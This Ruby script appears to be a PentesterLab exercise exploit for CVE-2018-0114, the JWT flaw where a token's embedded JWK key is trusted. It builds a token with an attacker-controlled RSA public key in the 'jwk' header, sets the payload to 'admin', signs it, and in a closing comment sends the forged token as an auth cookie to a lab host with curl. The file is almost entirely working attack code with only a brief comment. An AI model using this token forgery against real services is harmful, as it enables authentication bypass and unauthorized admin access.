# this exploit will work with getting the token, decoding and tampering with the payload, generating a new RSA key
#  adding "n" & "e" t the header and useing RS256, and then resigning the token with your RSA key


require 'openssl'
require 'base64'
require 'json'

priv = OpenSSL::PKey::RSA.new File.read '../PTLFiles/private.pem'
pub = priv.public_key
n = Base64.urlsafe_encode64(pub.n.to_s(2)).gsub(/=+$/,"")
e = Base64.urlsafe_encode64(pub.e.to_s(2)).gsub(/=+$/,"")

header = {"alg" => "RS256", "jwk" => {"kty" => "RSA", "kid" => "pentesterlab", "use" => "sig", "n" => n, "e" => e}}

payload = Base64.urlsafe_encode64("admin").gsub(/=+$/,"")

token = Base64.urlsafe_encode64(header.to_json).gsub(/=+$/,"")+"."+payload

sign = priv.sign("SHA256", token)

puts token+"."+Base64.urlsafe_encode64(sign).gsub(/=+$/,"")


# curl -H "Cookie: auth=$(ruby CVE-2018-0114_exploit.rb)" http://ptl-a8202dd4-ff38b064.libcurl.so/